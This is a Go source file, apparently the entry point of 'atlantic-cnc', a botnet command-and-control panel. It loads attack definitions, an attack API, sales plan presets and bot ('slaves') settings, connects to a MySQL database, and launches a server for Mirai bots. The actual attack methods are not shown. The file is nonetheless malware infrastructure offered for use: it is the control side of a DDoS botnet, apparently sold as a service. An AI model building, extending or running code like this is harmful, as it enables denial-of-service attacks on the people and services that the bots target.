package main

import (
//        "os"
	"fmt"
	"log"
	"strconv"

	"atlantic-cnc/core/mysql"
	"atlantic-cnc/core/sessions/themes"
	"atlantic-cnc/core/models/middleware/attack_sort"
	"atlantic-cnc/core/models/client"
	"atlantic-cnc/core/models/client/load"
	"atlantic-cnc/core/models/json/build"
	"atlantic-cnc/core/models/server"
	"atlantic-cnc/core/models/versions"
	"atlantic-cnc/core/models/external"
        "atlantic-cnc/core/slaves/transition"

//        License "atlantic-cnc/core/models/license"
        slaves "atlantic-cnc/core/slaves/mirai"
)

func main() {

	Cli := versions.GetVersion()
	if Cli == nil {
		log.Println("[undefined edition] [editions version can't be located]")
		return
	}

	fmt.Println("Starting atlantic `" + Cli.Edition + "`, `" + Cli.Version + "`")

//        check := License.LicenseGet()
//        if !check {
//                os.Exit(1)
//        }

	error := build.NewParse_config_json()
	if error != nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["ConfigFile"] + "`] [" + error.Error() + "]")
		return
	} else if build.Config == nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["ConfigFile"] + "`] [" + "unknown error appeared" + "]")
		return
	} else {
		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["ConfigFile"] + "`]")
	}

	_, error = build.LoadAttacks()
	if error != nil {
//		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["API_Attack"] + "`] [" + error.Error() + "]")
		return
	} else {
//		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["API_Attack"] + "`]")
	}

        error = build.NewParse_Attack_Json()
        if error != nil {
                log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["API_Attack"] + "`] [" + error.Error() + "]")
                return
        } else if build.AttackAPI == nil {
                log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["API_Attack"] + "`] [" + "unknown error appeared" + "]")
                return
        } else {
                log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["API_Attack"] + "`]")
        }

	error = build.NewParse_Preset_json()
	if error != nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["PlanPresets"] + "`] [" + error.Error() + "]")
		return
	} else if build.Config == nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["PlanPresets"] + "`] [" + "unknown error appeared" + "]")
		return
	} else {
		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["PlanPresets"] + "`]")
	}

	error = build.NewParse_Themes_json()
	if error != nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["Themes"] + "`] [" + error.Error() + "]")
		return
	} else if build.Config == nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["Themes"] + "`] [" + "unknown error appeared" + "]")
		return
	} else {
		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["Themes"] + "`]")
	}

        _, error = build.LoadSlaves()
        if error != nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `slaves.json`] [" + error.Error() + "]")
		return
        } else {
		log.Println("[JSON Correct] [Correctly parsed your `slaves`]")
        }

        _, error = build.LoadOptions()
        if error != nil {
		log.Println("[JSON Fatal] [Failed to correctly parse `slaves.json`] [" + error.Error() + "]")
		return
        } else {
		log.Println("[JSON Correct] [Correctly parsed your `slaves`]")
        }

	error = database.Database_Connect()
	if error != nil {
		log.Println("[SQL Fatal] [Failed to correctly open to `" + build.Config.Database.Sql_host + "`] [" + error.Error() + "]")
		return
	}

	error = database.Database.Ping()
	if error != nil {
		log.Println("[SQL Fatal] [Failed to correctly connect to `" + build.Config.Database.Sql_host + "`] [" + error.Error() + "]")
		return
	}

	log.Println("[SQL Correct] [Correctly connected to your sql database at `" + build.Config.Database.Sql_host + "`]")

	Row := database.Check()
	if !Row {
		Placed, error := database.Create_Tables()
		if error != nil || Placed == 0 {
			log.Println("[SQL audit] [Failed to complete SQL Audit] [" + strconv.Itoa(Placed) + " tables were placed]")
			return
		} else if error == nil {
			log.Println("[SQL Audit] [SQL audit has been complete correctly] [" + strconv.Itoa(Placed) + " tables were placed]")
		}
	} else if Row {
		log.Println("[SQL Audit] [SQL audit has been complete correctly]")
	}

	themes.Walk()

	_, error = load.Load()
	if error != nil {
		log.Println("[Branding Fatal] [Failed to load any branding due to an unknown error] [" + error.Error() + "]")
		return
	} else {
		log.Println("[Branding correct] [Correctly loaded " + strconv.Itoa(len(client.ClientMap)) + " items of branding]")
	}

        if build.Config.Slaves.Status {
                log.Println(" [Starting mirai server...]")
                go slaves.Serve()
        } else if build.Option.SlaveTransition.Status {
                log.Println(" [Slave transition starting...]")
                go transition.Connection()
        }
	attacksort.SortMets()
	errors := external.GatherExCommands()
	if errors != nil {
		log.Println("[Failed to load commands correctly]")
		for _, error := range errors {
			log.Println("	- "+error.Error())
		}
		return
	}
	server.New()

}

